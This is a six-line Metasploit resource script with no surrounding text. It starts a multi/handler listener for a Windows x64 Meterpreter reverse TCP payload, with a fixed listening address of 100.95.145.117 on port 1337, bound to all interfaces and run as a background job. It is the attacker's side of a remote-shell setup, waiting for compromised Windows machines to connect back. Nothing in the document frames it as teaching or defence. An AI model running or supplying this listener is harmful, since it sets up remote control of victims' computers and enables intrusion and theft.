use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 100.95.145.117
set LPORT 1337
set ReverseListenerBindAddress 0.0.0.0
exploit -j
